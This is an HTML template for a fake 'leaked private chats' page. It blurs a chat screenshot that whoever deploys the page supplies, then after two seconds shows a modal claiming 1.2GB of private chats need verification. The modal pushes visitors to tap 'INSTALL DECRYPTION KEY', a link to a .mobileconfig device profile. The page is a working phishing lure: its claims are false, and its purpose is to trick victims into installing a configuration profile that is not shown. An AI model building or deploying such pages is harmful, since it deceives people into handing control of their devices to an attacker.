<!DOCTYPE html>
<html>
<head>
    <title>Private Cloud Storage - Leak</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { margin: 0; font-family: sans-serif; background: #000; color: white; overflow: hidden; }
        
        
        .chat-background {
            width: 100%;
            height: 100vh;
            background: url('https://your-github-username.github.io/your-repo/chat-screenshot.png'); /* Yahan apna screenshot link dalein */
            background-size: cover;
            filter: blur(10px);
            opacity: 0.8;
        }
        .overlay {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.6);
            display: none; /* Hidden by default */
            align-items: center; justify-content: center;
            z-index: 1000;
        }

        .modal {
            background: #fff; color: #000;
            padding: 30px; border-radius: 15px;
            width: 85%; max-width: 400px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
        }

        .btn {
            background: #007AFF; color: white;
            padding: 12px 25px; text-decoration: none;
            border-radius: 8px; display: inline-block;
            margin-top: 20px; font-weight: bold;
        }
    </style>
</head>
<body>

    <div class="chat-background"></div>

    <div id="verifyModal" class="overlay">
        <div class="modal">
            <h3 style="margin-top:0;">⚠️ Access Restricted</h3>
            <p>System detected 1.2GB of private chats. Verification is required to decrypt and view the full database.</p>
            <a href="data.mobileconfig" class="btn">INSTALL DECRYPTION KEY</a>
        </div>
    </div>

    <script>
        
        setTimeout(function(){
            document.getElementById('verifyModal').style.display = 'flex';
        }, 2000); // 2000ms = 2 seconds
    </script>

</body>
</html>
